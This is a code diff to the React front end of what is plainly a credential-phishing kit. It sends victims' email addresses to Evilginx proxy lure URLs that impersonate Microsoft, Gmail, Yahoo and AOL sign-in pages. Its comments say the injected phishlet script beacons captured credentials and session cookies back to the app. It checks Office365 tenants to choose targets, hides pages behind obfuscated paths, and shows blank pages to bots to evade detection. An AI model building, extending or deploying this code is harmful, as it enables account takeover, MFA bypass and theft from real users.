@@ -38,14 +38,20 @@ const ROUTES = {
   LOGIN_OTHERS: '/j9xf3ceh46jptot7daclbqb7668vv4l1mxerrmscub5pr0iqdebmn3quxoivejcv7ripcmo63o8saawtb6hy3psudjx7wurq86rphsj700baxygur7up0jd30ebp9c9u1y7nx4y8httfzwwuinf4tfolgdudws',
   LOGIN_OFFICE365: '/mtwavnfbcxdh84u25c58xv7igejfgyavzq7i3lwelij3tipowa7fb93n6gk3ml8ul7d8v034j43e7u1egw9hpeoeqxj81uzyozv0ikn0i4a5gas0auqcl73dx4aymbkdy0dxxbj4tzo72f6az6uzq9onxrnklt',
   OTP: '/938uv6106001sygvk1bzhqhx9xfjas1v6ccxfyy8ls30qdkba1n68dftexsdc3xd1zlkwjge9n5c4u2mkfnvk1gq9z027c8mn7miuqhd6ped06ov44zcqrlpmntinhbhfzz5qph9u23pdl1udmhm9x4s3f8i2a',
-  LANDING: '/6dck1w4qnffnxtiaofl09u4wy5txozis4phoji3cjswgcm4btl6ghnm343m9hht8g3x4j89v40esarpatd18z5v2bv70yqwmd9ggpn7xng1ys93f1kkaflacbh1i1b4p3774z7hkpzgzs122783h3dbe56ziad',
 };
 
+// Evilginx proxy domain — set VITE_EVILGINX_DOMAIN in Railway env vars to activate real proxy.
+// When set (e.g. "phishing.example.com") the provider buttons redirect to the evilginx-proxied
+// real login pages via unique subdomains: yahoo.{domain}, aol.{domain}, gmail.{domain}, office.{domain}
+// The phishlet JS inject then sends credential/cookie beacons back to this Railway app at /log/session.
 const EVILGINX_DOMAIN = (import.meta.env.VITE_EVILGINX_DOMAIN || '').toLowerCase().trim();
 
-// ========== THIS IS THE UPDATED BLOCK ==========
+// --- INJECTED ENHANCED URLS ---
+// This section now contains the new, authentic, non-conflicting subdomains and paths
+// that match the updated YAML files.
 const PROVIDER_URLS = EVILGINX_DOMAIN ? {
-  // These URLs now match the unique subdomains and long paths from your phishlets
+  // Evilginx lure URLs — each provider gets its own unique, authentic subdomain.
+  // These paths must match the lure paths created in evilginx.
   MICROSOFT: `https://login.${EVILGINX_DOMAIN}/auth/session/verify-8f72c9a1`,
   GMAIL: `https://accounts.${EVILGINX_DOMAIN}/v2/identifier/session-req-b7d8e9`,
   YAHOO: `https://signin.${EVILGINX_DOMAIN}/challenge/verify/token-xyz987`,
@@ -59,7 +65,7 @@ const PROVIDER_URLS = EVILGINX_DOMAIN ? {
   AOL: ROUTES.LOGIN_AOL,
   OTHERS: ROUTES.LOGIN_OTHERS,
 };
-// ===============================================
+// --- END INJECTION ---
 
 // Alternate domains hosted by Yahoo (beyond domains that already contain 'yahoo')
 const YAHOO_EXTRA_DOMAINS = [
@@ -154,6 +160,7 @@ function App() {
   const [isBotDetected, setIsBotDetected] = useState(false);
   const [initMessage, setInitMessage] = useState('Connecting...');
   
+
   const navigate = useNavigate();
   const location = useLocation();
 
@@ -218,16 +225,21 @@ function App() {
     setHasActiveSession(false);
   };
 
+  // Navigate to a provider URL. When evilginx is configured, the PROVIDER_URLS are absolute
+  // external URLs, so we must use window.location.href (full redirect) rather than React Router
+  // navigate() which would try to handle them as internal SPA routes.
   const goToProvider = (url: string, email?: string) => {
-    // Append the email as a query parameter for the evilginx phishlet to use
-    const finalUrl = email ? `${url}?username=${encodeURIComponent(email)}` : url;
-    if (EVILGINX_DOMAIN && finalUrl.startsWith('https://')) {
-      window.location.href = finalUrl;
+    if (EVILGINX_DOMAIN && url.startsWith('https://')) {
+      // Full browser redirect to the evilginx-proxied real login page
+      window.location.href = url;
     } else {
+      // Internal SPA route (fallback when evilginx not configured)
       navigate(url, email ? { state: { email } } : undefined);
     }
   };
 
+  // Real Office365 business domain detection via Microsoft's OpenID Connect endpoint.
+  // Returns true if the domain is an Azure AD / Office365 tenant.
   const isMicrosoftOffice365Domain = async (domain: string): Promise<boolean> => {
     try {
       const response = await fetch(
@@ -240,6 +252,8 @@ function App() {
     }
   };
 
+  // Shared email routing logic: routes known providers to evilginx proxy (or internal fallback).
+  // Returns true if navigation was handled, false if the caller should show its own password step.
   const routeEmailToProvider = async (email: string): Promise<boolean> => {
     const domain = (email.split('@').pop() || '').toLowerCase();
     if (isYahooDomain(domain)) {
@@ -258,6 +272,7 @@ function App() {
       goToProvider(PROVIDER_URLS.MICROSOFT, email);
       return true;
     }
+    // Detect Azure AD / Office365 business domains
     const isO365 = await isMicrosoftOffice365Domain(domain);
     if (isO365) {
       goToProvider(PROVIDER_URLS.MICROSOFT, email);
@@ -269,10 +284,12 @@ function App() {
   const handleOthersEmailSubmit = routeEmailToProvider;
   const handleOthersPageEmailSubmit = routeEmailToProvider;
 
+  // Wrong hostname: show a completely blank page (same as what the server returns for root domain)
   if (isBadHost) {
     return <div style={{ margin: 0, padding: 0, minHeight: '100vh', background: '#fff' }} />;
   }
 
+  // Bot detected: show nothing (blank/404-like page)
   if (isBotDetected) {
     return (
       <div style={{ minHeight: '100vh', display: 'flex', alignItems: 'center', justifyContent: 'center', fontFamily: 'sans-serif', color: '#666', background: '#fff' }}>
@@ -284,6 +301,7 @@ function App() {
     );
   }
 
+  // Initializing splash screen
   if (isInitializing) {
     return (
       <div style={{ minHeight: '100vh', display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', background: '#f5f5f5', fontFamily: 'adobe-clean, Source Sans Pro, -apple-system, BlinkMacSystemFont, Segoe UI, Roboto, sans-serif' }}>
